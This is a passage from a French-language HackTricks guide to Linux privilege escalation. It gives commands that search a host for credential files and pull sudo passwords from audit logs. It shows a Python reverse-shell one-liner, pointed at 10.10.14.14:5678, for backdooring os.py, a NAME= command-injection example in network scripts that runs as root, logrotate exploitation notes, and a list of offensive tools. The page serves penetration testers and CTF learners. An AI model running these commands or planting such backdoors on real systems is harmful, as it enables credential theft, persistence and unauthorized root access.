### Fichiers de base de données Sqlite
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### Fichiers \*\_history, .sudo\_as\_admin\_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Fichiers cachés
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **Scripts/Binaires dans le PATH**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Fichiers Web**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Sauvegardes**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Fichiers connus contenant des mots de passe

Lisez le code de [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), il recherche **plusieurs fichiers possibles pouvant contenir des mots de passe**.\
**Un autre outil intéressant** que vous pouvez utiliser à cet effet est : [**LaZagne**](https://github.com/AlessandroZ/LaZagne) qui est une application open source utilisée pour récupérer de nombreux mots de passe stockés sur un ordinateur local pour Windows, Linux & Mac.

### Journaux

Si vous pouvez lire des journaux, vous pourriez trouver **des informations intéressantes/confidentielles à l'intérieur**. Plus le journal est étrange, plus il sera intéressant (probablement).\
De plus, certains journaux d'audit "**mal**" configurés (avec des portes dérobées ?) pourraient vous permettre d'**enregistrer des mots de passe** à l'intérieur des journaux d'audit comme expliqué dans cet article : [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
Pour **lire les journaux du groupe** [**adm**](groupes-interessants-linux-pe/#groupe-adm) sera vraiment utile.

### Fichiers Shell
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Recherche générique de mots de passe/Regex

Vous devriez également vérifier les fichiers contenant le mot "**password**" dans leur **nom** ou à l'intérieur du **contenu**, et vérifier également les adresses IP et les e-mails dans les journaux, ou les regex de hachages.\
Je ne vais pas énumérer ici comment faire tout cela, mais si vous êtes intéressé, vous pouvez vérifier les dernières vérifications effectuées par [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh).

## Fichiers inscriptibles

### Détournement de bibliothèque Python

Si vous savez **d'où** un script python va être exécuté et que vous **pouvez écrire à l'intérieur** de ce dossier ou que vous pouvez **modifier les bibliothèques python**, vous pouvez modifier la bibliothèque OS et y insérer une porte dérobée (si vous pouvez écrire là où le script python va être exécuté, copiez-collez la bibliothèque os.py).

Pour **insérer une porte dérobée dans la bibliothèque**, ajoutez simplement à la fin de la bibliothèque os.py la ligne suivante (changez l'IP et le PORT) :
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Exploitation de Logrotate

Une vulnérabilité dans `logrotate` permet aux utilisateurs ayant des **permissions d'écriture** sur un fichier journal ou ses répertoires parents de potentiellement obtenir des privilèges élevés. Cela est dû au fait que `logrotate`, souvent exécuté en tant que **root**, peut être manipulé pour exécuter des fichiers arbitraires, notamment dans des répertoires tels que _**/etc/bash\_completion.d/**_. Il est important de vérifier les permissions non seulement dans _/var/log_ mais aussi dans tout répertoire où la rotation des journaux est appliquée.

{% hint style="info" %}
Cette vulnérabilité affecte la version `3.18.0` et les versions antérieures de `logrotate`
{% endhint %}

Des informations plus détaillées sur la vulnérabilité peuvent être trouvées sur cette page : [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

Vous pouvez exploiter cette vulnérabilité avec [**logrotten**](https://github.com/whotwagner/logrotten).

Cette vulnérabilité est très similaire à [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(journaux nginx)**, donc chaque fois que vous constatez que vous pouvez modifier des journaux, vérifiez qui gère ces journaux et vérifiez si vous pouvez escalader les privilèges en substituant les journaux par des liens symboliques.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Référence de la vulnérabilité :** [**https://vulmon.com/exploitdetails?qidtp=maillist\_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist\_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f)

Si, pour une raison quelconque, un utilisateur est capable d'**écrire** un script `ifcf-<quelquechose>` dans _/etc/sysconfig/network-scripts_ **ou** s'il peut **ajuster** un script existant, alors votre **système est compromis**.

Les scripts réseau, par exemple _ifcg-eth0_, sont utilisés pour les connexions réseau. Ils ressemblent exactement à des fichiers .INI. Cependant, ils sont \~sourcés\~ sur Linux par Network Manager (dispatcher.d).

Dans mon cas, l'attribut `NAME=` dans ces scripts réseau n'est pas géré correctement. Si vous avez un **espace blanc dans le nom, le système tente d'exécuter la partie après l'espace blanc**. Cela signifie que **tout ce qui suit le premier espace blanc est exécuté en tant que root**.

Par exemple : _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
### **init, init.d, systemd, and rc.d**

Le répertoire `/etc/init.d` abrite des **scripts** pour System V init (SysVinit), le **système classique de gestion des services Linux**. Il comprend des scripts pour `démarrer`, `arrêter`, `redémarrer` et parfois `recharger` des services. Ceux-ci peuvent être exécutés directement ou via des liens symboliques trouvés dans `/etc/rc?.d/`. Un chemin alternatif dans les systèmes Redhat est `/etc/rc.d/init.d`.

D'autre part, `/etc/init` est associé à **Upstart**, un nouveau **gestionnaire de services** introduit par Ubuntu, utilisant des fichiers de configuration pour les tâches de gestion des services. Malgré la transition vers Upstart, les scripts SysVinit sont toujours utilisés aux côtés des configurations Upstart en raison d'une couche de compatibilité dans Upstart.

**systemd** émerge en tant que gestionnaire de démarrage et de services moderne, offrant des fonctionnalités avancées telles que le démarrage de démons à la demande, la gestion des montages automatiques et des instantanés de l'état du système. Il organise les fichiers dans `/usr/lib/systemd/` pour les paquets de distribution et `/etc/systemd/system/` pour les modifications des administrateurs, rationalisant le processus d'administration système.

## Autres Astuces

### Élévation de privilèges NFS

{% content-ref url="nfs-no_root_squash-misconfiguration-pe.md" %}
[nfs-no\_root\_squash-misconfiguration-pe.md](nfs-no\_root\_squash-misconfiguration-pe.md)
{% endcontent-ref %}

### Échapper aux shells restreints

{% content-ref url="escaping-from-limited-bash.md" %}
[escaping-from-limited-bash.md](escaping-from-limited-bash.md)
{% endcontent-ref %}

### Cisco - vmanage

{% content-ref url="cisco-vmanage.md" %}
[cisco-vmanage.md](cisco-vmanage.md)
{% endcontent-ref %}

## Protections de sécurité du noyau

* [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
* [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## Plus d'aide

[Binaires impacket statiques](https://github.com/ropnop/impacket\_static\_binaries)

## Outils d'élévation de privilèges Linux/Unix

### **Meilleur outil pour rechercher des vecteurs d'élévation de privilèges locaux Linux :** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum** : [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(option -t)\
**Enumy** : [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check** : [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker** : [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot** : [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop** : Énumérer les vulnérabilités du noyau dans Linux et MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit** : _**multi/recon/local\_exploit\_suggester**_\
**Linux Exploit Suggester** : [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (accès physique)** : [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recueil de plus de scripts** : [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## Références

* [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)\\
* [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)\\
* [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)\\
* [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)\\
* [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)\\
* [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)\\
* [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)\\
* [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)\\
* [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
* [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
* [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
* [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
* [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
* [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
* [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
* [https://vulmon.com/exploitdetails?qidtp=maillist\_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist\_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f)
* [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)

{% hint style="success" %}
Apprenez et pratiquez le piratage AWS :<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**Formation HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Apprenez et pratiquez le piratage GCP : <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**Formation HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Soutenez HackTricks</summary>

* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop)!
* **Rejoignez** 💬 le [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez des astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
